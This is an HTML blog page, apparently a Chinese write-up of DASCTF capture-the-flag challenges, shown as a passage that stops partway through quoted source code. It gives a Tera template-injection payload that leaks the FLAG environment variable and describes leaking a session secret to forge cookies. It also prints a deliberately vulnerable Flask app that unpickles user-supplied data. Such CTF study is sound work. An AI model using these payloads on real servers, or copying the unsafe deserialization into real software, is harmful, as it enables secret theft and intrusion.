@@ -1,0 +1,1432 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Chicken\r1.签到题\r进入容器发现会先在https://game.wetolink.com/停留一段时间然后会跳转到https://game.gcsis.cn/compete/home/8c3adb14b154482\n">
+<title>DASCTF</title>
+
+<link rel='canonical' href='https://Oight.github.io/p/dasctf/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="DASCTF">
+<meta property='og:description' content="Chicken\r1.签到题\r进入容器发现会先在https://game.wetolink.com/停留一段时间然后会跳转到https://game.gcsis.cn/compete/home/8c3adb14b154482\n">
+<meta property='og:url' content='https://Oight.github.io/p/dasctf/'>
+<meta property='og:site_name' content='Oight'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-06-01T10:28:21&#43;08:00'/><meta property='article:modified_time' content='2025-06-01T10:28:21&#43;08:00'/>
+<meta name="twitter:title" content="DASCTF">
+<meta name="twitter:description" content="Chicken\r1.签到题\r进入容器发现会先在https://game.wetolink.com/停留一段时间然后会跳转到https://game.gcsis.cn/compete/home/8c3adb14b154482\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_37edead8cd3c258e.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Oight</a></h1>
+            <h2 class="site-description">talk is cheap, show me the code.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/696224138'
+                        target="_blank"
+                        title="bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Oight'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1签到题">1.签到题</a></li>
+    <li><a href="#2西湖论剑邀请函获取器">2.西湖论剑邀请函获取器</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#const_python">const_python</a></li>
+    <li><a href="#yaml_matser">yaml_matser</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#tryre">tryre</a></li>
+    <li><a href="#secret_of_inkey">secret_of_inkey</a>
+      <ol>
+        <li><a href="#payautogui">Payautogui</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%A4%8D%E7%8E%B0/" >
+                复现
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/dasctf/">DASCTF</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-06-01</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 7 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="chicken">Chicken
+</h1><h2 id="1签到题">1.签到题
+</h2><p>进入容器发现会先在<code>https://game.wetolink.com/</code>停留一段时间然后会跳转到<code>https://game.gcsis.cn/compete/home/8c3adb14b154482</code></p>
+<p>一开始以为是类似于需要“买东西”之类的WEB题，需要获取管理员权限，更改数据之类的操作</p>
+<p>后根据hint，发现只需要扫一下<code>https://game.wetolink.com/</code>，发现robots.txt，访问robots.txt得到flag</p>
+<h2 id="2西湖论剑邀请函获取器">2.西湖论剑邀请函获取器
+</h2><p>因为题目里有上传图片文件的功能以及会有管理员看见的字样，以为是XSS，但没发现注入点</p>
+<p>后hint中说“队名好像可以 81 ”、“是 Rust 吗（喜）”、   “不用RCE，拿到环境变量FLAG的内容即可。”</p>
+<p>在FLAG兑换区域输入”81“,返回“81”说明存在SSTI</p>
+<p>由题可知，这道题是RUST写的。查询资料得知RUST中常见的WEB模板有：</p>
+<p>Tera</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Tera 是Rust中一个高性能的模板引擎，类似于Jinja2（Python）和Liquid（Ruby）。它支持复杂的模板功能，但如果输入没有得到适当的验证，攻击者可能会通过注入模板代码来触发SSTI漏洞。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><a class="link" href="https://github.com/Keats/tera"  target="_blank" rel="noopener"
+    >Tera GitHub</a></p></blockquote>
+<p>Askama</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Askama 是另一个Rust模板引擎，采用编译时模板渲染。它是基于Rust的类型系统，模板是在编译时进行检查的，这意味着在某些情况下可以避免SSTI攻击，因其不允许任意的动态代码执行。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><a class="link" href="https://github.com/rinja-rs/askama"  target="_blank" rel="noopener"
+    >Askama GitHub</a></p></blockquote>
+<p>Handlebars</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Handlebars 是一个流行的模板引擎，Rust中的实现通常为 handlebars-rust。与其他模板引擎一样，如果不当使用，也可能导致SSTI漏洞。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p><a class="link" href="https://github.com/sunng87/handlebars-rust"  target="_blank" rel="noopener"
+    >Handlebars GitHub</a></p></blockquote>
+<p>查询得知这道题使用Tera模板</p>
+<blockquote>
+<p><a class="link" href="https://brycec.me/posts/corctf_2023_challenges"  target="_blank" rel="noopener"
+    >Tera的SSTI</a></p></blockquote>
+<p>在其中有</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">So</span><span class="p">,</span> <span class="n">the</span> <span class="n">session</span> <span class="n">store</span> <span class="n">used</span> <span class="n">by</span> <span class="n">the</span> <span class="n">application</span> <span class="n">is</span> <span class="n">a</span> <span class="n">CookieStore</span><span class="p">,</span> <span class="n">where</span> <span class="n">the</span> <span class="n">secret</span> <span class="n">used</span> <span class="n">comes</span> <span class="n">from</span> <span class="n">the</span> <span class="n">SECRET</span> <span class="n">environment</span> <span class="n">variable</span><span class="o">!</span> <span class="n">So</span><span class="p">,</span> <span class="k">if</span> <span class="n">we</span> <span class="n">can</span> <span class="n">leak</span> <span class="n">the</span> <span class="n">SECRET</span> <span class="n">env</span> <span class="k">var</span><span class="p">,</span> <span class="n">we</span> <span class="n">could</span> <span class="nb">sign</span> <span class="n">our</span> <span class="n">own</span> <span class="n">sessions</span> <span class="n">with</span> <span class="n">arbitrary</span> <span class="n">data</span> <span class="p">(</span><span class="n">since</span> <span class="n">the</span> <span class="n">complete</span> <span class="n">session</span> <span class="n">data</span> <span class="n">is</span> <span class="n">stored</span> <span class="ow">in</span> <span class="n">the</span> <span class="n">cookie</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Okay</span><span class="p">,</span> <span class="n">let</span><span class="s1">&#39;s do this. Following Tera&#39;</span><span class="n">s</span> <span class="n">format</span><span class="p">,</span> <span class="n">we</span> <span class="n">can</span> <span class="n">leak</span> <span class="n">the</span> <span class="n">session</span> <span class="n">with</span> <span class="p">{{</span> <span class="n">get_env</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;SECRET&#34;</span><span class="p">)</span> <span class="p">}}:</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以发现这道题也是没法RCE但可以泄露环境变量，但显然CORCTF中的这道题更难（毕竟DASCTF中的这道签到题只是其中的一个知识点）</p>
+<p>所以我们知道在Tera 中利用SSTI读取环境变量可以使用 <em>get_env</em> 这个内置函数，其格式为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{ get_env(name=&#34;SECRET&#34;) }}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们要读FLAG的内容，所以payload为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{ get_env(name=&#34;FLAG&#34;) }}  
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到flag</p>
+<h1 id="web">WEB
+</h1><h2 id="const_python">const_python
+</h2><p>有一说一，这次 const_python 和 yaml_matser 两道WEB题都没回显，第一次做这样的题，所以很不适应</p>
+<p>hint提示在 /src 中可以读到源码，进入其中直接得到一部分源码，还有一部分源码藏在HTML注释里，源码是用Python写的</p>
+<p>源码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">plaintext</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">builtins</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">io</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">sys</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">uuid</span>
+</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">flask</span> <span class="n">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span><span class="n">jsonify</span><span class="p">,</span><span class="n">session</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">pickle</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">base64</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;SECRET_KEY&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">User</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="s1">&#39;ctfer&#39;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">username</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">password</span>
+</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">auth</span> <span class="o">=</span> <span class="n">auth</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Admin</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span><span class="s2">&#34;admin&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;Welcome to my application&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">post_login</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">username</span> <span class="o">==</span> <span class="s1">&#39;admin&#39;</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">password</span> <span class="o">==</span> <span class="n">admin</span><span class="o">.</span><span class="n">password</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;admin&#34;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;Welcome Admin&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;Invalid Credentials&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;form method=&#34;post&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;!-- /src may help you&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            Username: &lt;input type=&#34;text&#34; name=&#34;username&#34;&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            Password: &lt;input type=&#34;password&#34; name=&#34;password&#34;&gt;&lt;br&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;input type=&#34;submit&#34; value=&#34;Login&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/form&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">@</span><span class="n">app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/ppicklee&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">ppicklee</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;not allowed&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&#34;not allowed&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">pickle_data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
